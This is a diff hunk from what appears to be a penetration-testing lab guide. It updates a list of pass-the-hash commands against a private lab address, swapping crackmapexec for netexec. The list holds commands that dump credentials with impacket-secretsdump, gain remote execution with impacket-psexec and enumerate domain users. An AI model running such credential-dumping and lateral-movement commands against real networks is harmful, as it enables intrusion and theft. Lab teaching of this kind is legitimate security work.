@@ -177,7 +177,7 @@ impacket-secretsdump -hashes :NTLM_HASH_HERE administrator@192.168.56.10
 impacket-psexec -hashes :NTLM_HASH_HERE administrator@192.168.56.10
 
 # Option 4: List domain admins
-crackmapexec smb 192.168.56.10 -u administrator -H NTLM_HASH_HERE --users
+netexec smb 192.168.56.10 -u administrator -H NTLM_HASH_HERE --users
 ```
 
 **Expected Output (secretsdump):**
